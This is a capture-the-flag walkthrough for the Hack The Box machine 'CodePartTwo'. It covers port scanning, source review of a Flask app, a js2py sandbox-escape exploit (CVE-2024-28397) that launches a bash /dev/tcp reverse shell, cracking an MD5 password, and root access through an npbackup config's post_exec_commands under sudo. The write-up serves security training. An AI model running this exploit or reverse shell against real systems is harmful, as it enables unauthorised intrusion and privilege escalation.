---
layout: post
title: "[HTB] CodePartTwo"
description: "[Machine] - Easy difficulty"
background: /img/bg-machine.jpg
tags: [htb]
difficulty: Easy
---

![](/img/htb_img/CodePartTwo_img/img1.png)

- OS: Linux
- Release Date: 16 Aug 2025
- Difficulty: Easy

<br>

# Enumeration

## Nmap recon

```bash
❯ sudo nmap -p- --min-rate 5000 --open -sS -Pn -n -vvv -oG allports $target
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-23 18:16 CEST
Initiating SYN Stealth Scan at 18:16
Scanning 10.129.xx.xx [65535 ports]
Discovered open port 22/tcp on 10.129.xx.xx
Discovered open port 8000/tcp on 10.129.xx.xx
Completed SYN Stealth Scan at 18:16, 13.06s elapsed (65535 total ports)
Nmap scan report for 10.129.xx.xx
Host is up, received user-set (0.038s latency).
Scanned at 2025-08-23 18:16:17 CEST for 13s
Not shown: 64582 closed tcp ports (reset), 951 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE  REASON
22/tcp   open  ssh      syn-ack ttl 63
8000/tcp open  http-alt syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 13.13 seconds
           Raw packets sent: 73454 (3.232MB) | Rcvd: 66768 (2.671MB)
```

Scripts and versions scan:

```
❯ extractPorts allports

[*] Extracting information...

	[*] IP Address: 10.129.xx.xx
	[*] Open ports: 22,8000

[*] Ports copied to clipboard

❯ nmap -p22,8000 -sCV -Pn -oN targeted $target              
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-23 18:17 CEST
Nmap scan report for 10.129.xx.xx
Host is up (0.037s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 [REDACTED] (RSA)
|   256 [REDACTED] (ECDSA)
|_  256 [REDACTED] (ED25519)
8000/tcp open  http    Gunicorn 20.0.4
|_http-title: Welcome to CodeTwo
|_http-server-header: gunicorn/20.0.4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.36 seconds
```

Port TCP 22 (SSH) and port TCP 8000 (HTTP). Web port is running Gunicorn.

> **Info:** 'Green Unicorn' is a ***Python WSGI HTTP Server for UNIX***. It's a pre-fork worker model. The Gunicorn server is broadly compatible with various web frameworks.

---

## TCP 8000 - Gunicorn

![](/img/htb_img/CodePartTwo_img/img2.png)

This website lets us download the app zip, so we can analyze its source code.

```
❯ tree              
.
├── app.py
├── instance
│   └── users.db
├── requirements.txt
├── static
│   ├── css
│   │   └── styles.css
│   └── js
│       └── script.js
└── templates
    ├── base.html
    ├── dashboard.html
    ├── index.html
    ├── login.html
    ├── register.html
    └── reviews.html

6 directories, 11 files
```

The `users.db` bundled in the zip has no registered users yet — the live instance's database is what matters.

```
from flask import Flask, render_template, request, redirect, url_for, session, jsonify, send_from_directory
from flask_sqlalchemy import SQLAlchemy
import hashlib
import js2py
import os
import json

js2py.disable_pyimport()
app = Flask(__name__)
app.secret_key = 'S3cr3tK3yC0d3Tw0'
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///users.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password_hash = db.Column(db.String(128), nullable=False)

class CodeSnippet(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    code = db.Column(db.Text, nullable=False)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/dashboard')
def dashboard():
    if 'user_id' in session:
        user_codes = CodeSnippet.query.filter_by(user_id=session['user_id']).all()
        return render_template('dashboard.html', codes=user_codes)
    return redirect(url_for('login'))

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        password_hash = hashlib.md5(password.encode()).hexdigest()
        new_user = User(username=username, password_hash=password_hash)
        db.session.add(new_user)
        db.session.commit()
        return redirect(url_for('login'))
    return render_template('register.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        password_hash = hashlib.md5(password.encode()).hexdigest()
        user = User.query.filter_by(username=username, password_hash=password_hash).first()
        if user:
            session['user_id'] = user.id
            session['username'] = username;
            return redirect(url_for('dashboard'))
        return "Invalid credentials"
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.pop('user_id', None)
    return redirect(url_for('index'))

@app.route('/save_code', methods=['POST'])
def save_code():
    if 'user_id' in session:
        code = request.json.get('code')
        new_code = CodeSnippet(user_id=session['user_id'], code=code)
        db.session.add(new_code)
        db.session.commit()
        return jsonify({"message": "Code saved successfully"})
    return jsonify({"error": "User not logged in"}), 401

@app.route('/download')
def download():
    return send_from_directory(directory='/home/app/app/static/', path='app.zip', as_attachment=True)

@app.route('/delete_code/<int:code_id>', methods=['POST'])
def delete_code(code_id):
    if 'user_id' in session:
        code = CodeSnippet.query.get(code_id)
        if code and code.user_id == session['user_id']:
            db.session.delete(code)
            db.session.commit()
            return jsonify({"message": "Code deleted successfully"})
        return jsonify({"error": "Code not found"}), 404
    return jsonify({"error": "User not logged in"}), 401

@app.route('/run_code', methods=['POST'])
def run_code():
    try:
        code = request.json.get('code')
        result = js2py.eval_js(code)
        return jsonify({'result': result})
    except Exception as e:
        return jsonify({'error': str(e)})

if __name__ == '__main__':
    with app.app_context():
        db.create_all()
    app.run(host='0.0.0.0', debug=True)
```

In the app we can find some vulnerabilities with js2py and that the passwords are in MD5.
It's possible to do a js2py sandbox escape because the only sandbox control is `disable_pyimport()` .

https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape
---

# Foothold
We create an account and realize that we have a Python interpreter:
![](/img/htb_img/CodePartTwo_img/img3.png)

With this exploit:
```
var hacked = Object.getOwnPropertyNames({});
var bymarve = hacked.__getattribute__;
var n11 = bymarve("__getattribute__");
var obj = n11("__class__").__base__;

function findPopen(o) {
	var subs = o.__subclasses__();
	for (var i in subs) {
		try {
			var item = subs[i];
			if (item && item.__module__ && item.__name__) {
				if (item.__module__ == "subprocess" && item.__name__ == "Popen") {
					return item;
				}
			}
			if (item && item.__name__ != "type") {
				var result = findPopen(item);
				if (result) return result;
			}
		} catch(e) {
			continue;
		}
	}
	return null;
}

var Popen = findPopen(obj);

if (Popen) {
	var cmd = "bash -c 'exec 5<>/dev/tcp/10.10.1x.xxx/4444;cat <&5 | while readline; do $line 2>&5 >&5; done'";
	var out = Popen(cmd, -1, null, -1, -1, -1, null, null, true).communicate();
	console.log(out);
} else {
	console.log("Popen not found");
}
```
---
Executing this gives us a shell back to the listener.
```
❯ netcat -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.1x.xxx] from (UNKNOWN) [10.129.xx.xx] 52926
id
uid=1001(app) gid=1001(app) groups=1001(app)
```
---

## Elevating the shell
```
script /dev/null -c bash
Script started, file is /dev/null
app@codetwo:~/app$ ^Z
[1]  + 35231 suspended  netcat -lvnp 4444

❯ stty raw -echo; fg       
[1]  + 35231 continued  netcat -lvnp 4444

app@codetwo:~/app$ export TERM=xterm
app@codetwo:~/app$
```
---
# Lateral movement
The live `users.db` on the machine has registered users. Downloading it to our attacker machine and opening it reveals a password hash:
![](/img/htb_img/CodePartTwo_img/img4.png)

Passing this hash through [CrackStation](https://crackstation.net) gives us the plaintext password: `sweetangelbabylove`.
```
❯ ssh marco@10.129.xx.xx
marco@10.129.xx.xx's password:

marco@codetwo:~$
```

## User flag
This user has the first flag:
```
marco@codetwo:~$ cat user.txt 
<REDACTED>
```
---

# Privilege Escalation
Checking privileges:
```
marco@codetwo:~$ sudo -l
Matching Defaults entries for marco on codetwo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User marco may run the following commands on codetwo:
    (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
```

If we run this program:
```
marco@codetwo:~$ sudo /usr/local/bin/npbackup-cli
2025-08-23 17:24:32,787 :: INFO :: npbackup 3.0.1-linux-UnknownBuildType-x64-legacy-public-3.8-i 2025032101 - Copyright (C) 2022-2025 NetInvent running as root
2025-08-23 17:24:32,787 :: CRITICAL :: Cannot run without configuration file.
2025-08-23 17:24:32,797 :: INFO :: ExecTime = 0:00:00.014282, finished, state is: critical.
```

It requires a configuration file. Marco's home directory already contains `npbackup.conf`, so let's try running it with that.
```
marco@codetwo:~$ sudo /usr/local/bin/npbackup-cli -c npbackup.conf -b --force
2025-08-23 17:26:17,027 :: INFO :: npbackup 3.0.1-linux-UnknownBuildType-x64-legacy-public-3.8-i 2025032101 - Copyright (C) 2022-2025 NetInvent running as root
2025-08-23 17:26:17,068 :: INFO :: Loaded config 4E3B3BFD in /home/marco/npbackup.conf
2025-08-23 17:26:17,083 :: INFO :: Running backup of ['/home/app/app/'] to repo default
2025-08-23 17:26:18,422 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/generic_excluded_extensions
2025-08-23 17:26:18,423 :: ERROR :: Exclude file 'excludes/generic_excluded_extensions' not found
2025-08-23 17:26:18,423 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/generic_excludes
2025-08-23 17:26:18,423 :: ERROR :: Exclude file 'excludes/generic_excludes' not found
2025-08-23 17:26:18,423 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/windows_excludes
2025-08-23 17:26:18,423 :: ERROR :: Exclude file 'excludes/windows_excludes' not found
2025-08-23 17:26:18,424 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/linux_excludes
2025-08-23 17:26:18,424 :: ERROR :: Exclude file 'excludes/linux_excludes' not found
2025-08-23 17:26:18,424 :: WARNING :: Parameter --use-fs-snapshot was given, which is only compatible with Windows
using parent snapshot 35a4dac3

Files:           0 new,     4 changed,     8 unmodified
Dirs:            0 new,     7 changed,     2 unmodified
Added to the repository: 24.053 KiB (14.724 KiB stored)

processed 12 files, 48.910 KiB in 0:00
snapshot 28efaed7 saved
2025-08-23 17:26:19,586 :: INFO :: Backend finished with success
2025-08-23 17:26:19,588 :: INFO :: Processed 48.9 KiB of data
2025-08-23 17:26:19,589 :: ERROR :: Backup is smaller than configured minmium backup size
2025-08-23 17:26:19,589 :: ERROR :: Operation finished with failure
2025-08-23 17:26:19,589 :: INFO :: Runner took 2.507357 seconds for backup
2025-08-23 17:26:19,589 :: INFO :: Operation finished
2025-08-23 17:26:19,595 :: INFO :: ExecTime = 0:00:02.571316, finished, state is: errors.
marco@codetwo:~$
```

npbackup supports a `post_exec_commands` field in its configuration that runs shell commands after the backup completes — and since we're running it as root via sudo, those commands also execute as root. We craft a malicious config that copies `/root/root.txt` to a world-readable location:
```
conf_version: 3.0.1
audience: public
repos:
  default:
    repo_uri: 
      __NPBACKUP__wd9051w9Y0p4ZYWmIxMqKHP81/phMlzIOYsL01M9Z7IxNzQzOTEwMDcxLjM5NjQ0Mg8PDw8PDw8PDw8PDw8PD6yVSCEXjl8/9rIqYrh8kIRhlKm4UPcem5kIIFPhSpDU+e+E__NPBACKUP__
    repo_group: default_group
    backup_opts:
      paths:
      - /root
      source_type: folder_list
      post_exec_commands: 
      - "mkdir -p /tmp/rooty"
      - "cp /root/root.txt /tmp/rooty/flag.txt 2>/dev/null || true"
      - "chmod 644 /tmp/rooty/flag.txt"
      - "chown marco:marco /tmp/rooty/flag.txt"
    repo_opts:
      repo_password: 
        __NPBACKUP__v2zdDN21b0c7TSeUZlwezkPj3n8wlR9Cu1IJSMrSctoxNzQzOTEwMDcxLjM5NjcyNQ8PDw8PDw8PDw8PDw8PD0z8n8DrGuJ3ZVWJwhBl0GHtbaQ8lL3fB0M=__NPBACKUP__

```

### Root flag
Execute it and we get the flag:
```
ls rooty/
flag.txt
marco@codetwo:/tmp$ cat rooty/flag.txt 
<REDACTED>
```
